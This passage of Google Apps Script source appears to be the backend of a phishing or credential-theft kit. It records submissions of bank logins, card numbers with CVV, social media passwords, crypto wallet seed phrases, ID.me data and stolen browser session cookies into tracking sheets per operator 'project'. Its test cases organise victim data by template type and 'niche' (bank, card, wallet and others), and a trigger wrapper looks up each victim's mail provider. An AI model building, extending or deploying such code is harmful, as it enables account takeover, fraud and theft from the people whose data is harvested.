      cards: cookieRowMap.cards || [],
      socials: cookieRowMap.socials || [],
      wallets: cookieRowMap.wallets || [],
      idMe: cookieRowMap.idMe || null,
      cookieJSON: cookieRowMap.formattedCookie || {}, // Mapping formattedCookie to cookieJSON
      cookieFileURL: cookieRowMap.driveUrl || ""      // Mapping driveUrl to cookieFileURL
    };

    const projectId = cookieRowMap.projectId;
    if (!projectId) {
      return createJsonResponse({
        success: false,
        error: `projectId not found in cookie data for browserId '${browserId}'.`
      });
    }

    // 2. Update Hub Sheet (first)
    const hubUpdateData = {
      verified: dataToUpdate.verified ? "TRUE" : "FALSE",
      fullAccess: dataToUpdate.fullAccess ? "TRUE" : "FALSE",
      banks: JSON.stringify(dataToUpdate.banks),
      cards: JSON.stringify(dataToUpdate.cards),
      socials: JSON.stringify(dataToUpdate.socials),
      wallets: JSON.stringify(dataToUpdate.wallets),
      // idMe: dataToUpdate.idMe, // Assuming idMe is not directly in hub sheet, or needs specific handling
      cookieJSON: JSON.stringify(dataToUpdate.cookieJSON),
      cookieFileURL: dataToUpdate.cookieFileURL,
      // Add status if there's a status column in hub
      // status: status // If a 'status' column exists in hub
    };

    const updateHubResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.HUB,
      "submissionId", // Search column in hub is submissionId
      browserId,      // browserId from cookie sheet matches submissionId in hub
      hubUpdateData
    );

    if (!updateHubResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to update hub sheet for browserId '${browserId}': ${updateHubResult.error}`
      });
    }
    Logger.log(`Hub sheet updated successfully for browserId: ${browserId}`);

    // 3. Update Projects Sheet
    const projectRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.PROJECTS, "projectId", projectId);

    if (!projectRowsResult.success || projectRowsResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Project with projectId '${projectId}' not found for updating response.`
      });
    }

    const projectHeaders = projectRowsResult.headers;
    const projectRowData = projectRowsResult.data[0]; // Assuming projectId is unique
    const projectRowMapForUpdate = {};
    projectHeaders.forEach((header, index) => {
      projectRowMapForUpdate[header] = projectRowData[index];
    });

    let existingResponses = [];
    const responseColumnValue = projectRowMapForUpdate.response;
    if (responseColumnValue) {
      try {
        existingResponses = JSON.parse(responseColumnValue);
        if (!Array.isArray(existingResponses)) {
          existingResponses = [];
        }
      } catch (e) {
        Logger.log("Error parsing existing project response JSON: " + e.message);
        existingResponses = [];
      }
    }

    let submissionEntryFound = false;
    const updatedResponses = existingResponses.map(entry => {
      if (entry.submissionId === browserId) {
        submissionEntryFound = true;
        return {
          ...entry,
          verified: dataToUpdate.verified,
          fullAccess: dataToUpdate.fullAccess,
          banks: dataToUpdate.banks,
          cards: dataToUpdate.cards,
          socials: dataToUpdate.socials,
          wallets: dataToUpdate.wallets,
          idMe: dataToUpdate.idMe,
          cookieJSON: dataToUpdate.cookieJSON,
          cookieFileURL: dataToUpdate.cookieFileURL
        };
      }
      return entry;
    });

    if (!submissionEntryFound) {
      Logger.log(`Submission entry with browserId '${browserId}' not found in project response JSON for projectId '${projectId}'.`);
      // Optionally, you might want to add it if it's not found, but the prompt implies updating existing.
    }

    const updateProjectResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.PROJECTS,
      "projectId",
      projectId,
      { "response": JSON.stringify(updatedResponses) }
    );

    if (!updateProjectResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to update project sheet response for projectId '${projectId}': ${updateProjectResult.error}`
      });
    }
    Logger.log(`Projects sheet response updated successfully for projectId: ${projectId}`);

    return createJsonResponse({
      success: true,
      message: `Hub and Projects sheets updated successfully for browserId: ${browserId}`,
      hubUpdate: updateHubResult,
      projectUpdate: updateProjectResult
    });

  } catch (error) {
    Logger.log("Error in updateHubAndProjectsFromCookieData: " + error.message);
    return createJsonResponse({
      success: false,
      error: "Server error in updateHubAndProjectsFromCookieData: " + error.message,
      stack: error.stack
    });
  }
}


/**
 * Test method for notifyFormSubmission.
 * This function simulates calls to notifyFormSubmission with sample data for various categories.
 * NOTE: For these tests to run successfully in a real Google Apps Script environment,
 * the spreadsheet with CONFIG.DB_ID must exist and contain a "projects" sheet
 * with rows matching the 'token' for each test case. Each project row should have
 * appropriate 'templateType', 'templateNiche', 'projectTitle', 'userId', 'projectId',
 * 'formId', and 'telegramGroupId' columns.
 * The external API calls will also need to be functional or mocked in a real setup.
 */
function testNotifyFormSubmission() {
  Logger.log("--- Running comprehensive testNotifyFormSubmission ---");

  // Helper to run a single test case
  function runTestCase(testName, token, formData, expectedProjectRowMap) {
    Logger.log(`\n--- Test Case: ${testName} ---`);
    Logger.log(`Simulating project row for token '${token}': ${JSON.stringify(expectedProjectRowMap)}`);

    // In a real test environment, you would mock getRowsByColumn to return this:
    // getRowsByColumn.mockReturnValueOnce({ success: true, headers: Object.keys(expectedProjectRowMap), data: [Object.values(expectedProjectRowMap)], count: 1 });

    const testParams = { token: token, formData: formData };
    const result = notifyFormSubmission(testParams);
    Logger.log(`Result for ${testName}: ${JSON.stringify(result, null, 2)}`);
  }

  // Test Case 1: PLAIN TemplateType
  runTestCase(
    "PLAIN Submission",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      email: "plain.user@example.com",
      password: "plainPassword123",
      ipData: { ip: "1.1.1.1", country: "Testland" },
      deviceData: { browser: "TestBrowser" }
    }
  );

  // Test Case 2: COOKIE TemplateType
  runTestCase(
    "COOKIE Submission",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      email: "cookie.user@example.com",
      password: "cookiePassword123",
      ipData: { ip: "2.2.2.2", country: "Cookieland" },
      deviceData: { browser: "CookieBrowser" },
      cookieJSON: { session: "abc", auth: "xyz" },
      verified: true, // Explicitly set in formData for COOKIE
      fullAccess: true // Explicitly set in formData for COOKIE
    }
  );

  // Test Case 3: TRUE-LOGIN - WIRE Niche
  runTestCase(
    "TRUE-LOGIN - WIRE Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      email: "wire.user@example.com",
      password: "wirePassword123",
      ipData: { ip: "3.3.3.3", country: "Wireland" },
      deviceData: { browser: "WireBrowser" }
    }
  );

  // Test Case 4: TRUE-LOGIN - BANK Niche
  runTestCase(
    "TRUE-LOGIN - BANK Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "4.4.4.4", country: "Bankland" },
      deviceData: { browser: "BankBrowser" },
      banks: [{ username: "bankUser", password: "bankPass", website: "mybank.com" }]
    }
  );

  // Test Case 5: TRUE-LOGIN - CARD Niche
  runTestCase(
    "TRUE-LOGIN - CARD Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "5.5.5.5", country: "Cardland" },
      deviceData: { browser: "CardBrowser" },
      cards: [{ cardNumber: "1111222233334444", expirationDate: "12/25", cvv: "123", issuer: "Visa", bankName: "CreditBank", website: "creditcard.com" }]
    }
  );

  // Test Case 6: TRUE-LOGIN - SOCIAL Niche
  runTestCase(
    "TRUE-LOGIN - SOCIAL Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "6.6.6.6", country: "Socialland" },
      deviceData: { browser: "SocialBrowser" },
      socials: [{ platform: "Facebook", username: "socialUser", password: "socialPass", website: "facebook.com" }]
    }
  );

  // Test Case 7: TRUE-LOGIN - WALLET Niche
  runTestCase(
    "TRUE-LOGIN - WALLET Niche",
    "536d1435-836a-403b-b6b6-ff92683cce02", // This token should exist in your 'projects' sheet
    {
      ipData: { ip: "7.7.7.7", country: "Walletland" },
      deviceData: { browser: "WalletBrowser" },
      wallets: [{ walletName: "MetaMask", wordPhrase: "word1 word2 word3", website: "metamask.io" }]
    }
  );

  Logger.log("\n--- All test cases completed ---");
}

/**
 * Wrapper function to be called by the time-driven trigger.
 * It retrieves the stored properties and calls updateMxRecordAndProvider.
 */
function runUpdateMxRecordAndProviderWrapper() {
  const scriptProperties = PropertiesService.getScriptProperties();
  const allProperties = scriptProperties.getProperties();

  // Find the property that matches a trigger ID pattern (if you had one)
  // For simplicity, let's assume the last set property is the one we need for now.
  // In a real scenario, you might iterate through properties or use a more specific key.
  let triggerIdFound = null;
  for (const key in allProperties) {
    // Assuming the triggerId is the key itself
    try {
      const properties = JSON.parse(allProperties[key]);
      if (properties.email && properties.submissionId) { // Check for submissionId
        triggerIdFound = key;
        break;
      }
    } catch (e) {
      // Not a JSON string or not the expected properties
      continue;
    }
  }

  if (triggerIdFound) {
    const propertiesString = scriptProperties.getProperty(triggerIdFound);
    scriptProperties.deleteProperty(triggerIdFound); // Clean up the property after use

    try {
      const { email, submissionId } = JSON.parse(propertiesString); // Retrieve submissionId
      Logger.log(`Wrapper: Retrieved email: ${email}, submissionId: ${submissionId}`);
      updateMxRecordAndProvider(email, submissionId); // Pass submissionId
    } catch (e) {
      Logger.log("Wrapper Error parsing properties or calling updateMxRecordAndProvider: " + e.message);
    }
  } else {
    Logger.log("Wrapper: No trigger properties found to process.");
  }

  // Delete all triggers for this function to prevent multiple executions
  const triggers = ScriptApp.getProjectTriggers();
  for (let i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === 'runUpdateMxRecordAndProviderWrapper') {
      ScriptApp.deleteTrigger(triggers[i]);
    }
  }
}

/**
 * Wrapper function to be called by the time-driven trigger.
 * It retrieves the stored properties and calls updateHubAndProjectsFromCookieData.
 */
function runUpdateHubAndProjectsFromCookieDataWrapper() {
  const scriptProperties = PropertiesService.getScriptProperties();
  const allProperties = scriptProperties.getProperties();

  let triggerIdFound = null;
  for (const key in allProperties) {
    try {
      const properties = JSON.parse(allProperties[key]);
      if (properties.browserId && properties.status) {
        triggerIdFound = key;
        break;
      }
    } catch (e) {
      continue;
    }
  }

  if (triggerIdFound) {
    const propertiesString = scriptProperties.getProperty(triggerIdFound);
    scriptProperties.deleteProperty(triggerIdFound);

    try {
      const { browserId, status } = JSON.parse(propertiesString);
      Logger.log(`Wrapper: Retrieved browserId: ${browserId}, status: ${status}`);
      updateHubAndProjectsFromCookieData(browserId, status);
    } catch (e) {
      Logger.log("Wrapper Error parsing properties or calling updateHubAndProjectsFromCookieData: " + e.message);
    }
  } else {
    Logger.log("Wrapper: No trigger properties found for updateHubAndProjectsFromCookieDataWrapper.");
  }

  const triggers = ScriptApp.getProjectTriggers();
  for (let i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === 'runUpdateHubAndProjectsFromCookieDataWrapper') {
      ScriptApp.deleteTrigger(triggers[i]);
    }
  }
}
